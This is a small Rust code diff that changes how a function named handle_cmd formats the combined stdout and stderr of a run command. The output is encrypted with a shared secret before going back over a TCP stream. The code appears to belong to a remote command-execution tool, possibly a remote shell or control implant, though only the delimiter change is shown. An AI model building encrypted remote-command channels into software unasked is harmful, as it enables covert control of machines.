@@ -226,7 +226,7 @@ pub fn handle_cmd(stream: &mut TcpStream, command: &str, os: String, shared_secr
 
     let stdout = String::from_utf8_lossy(&output.stdout);
     let stderr = String::from_utf8_lossy(&output.stderr);
-    let combined_output = format!("{}{}||cmd||\r\n", stdout, stderr);
+    let combined_output = format!("{}{}||cmd||", stdout, stderr);
 
     let encrypted_data =
         encrypt(combined_output.as_bytes(), shared_secret).expect("Failed to encrypt");
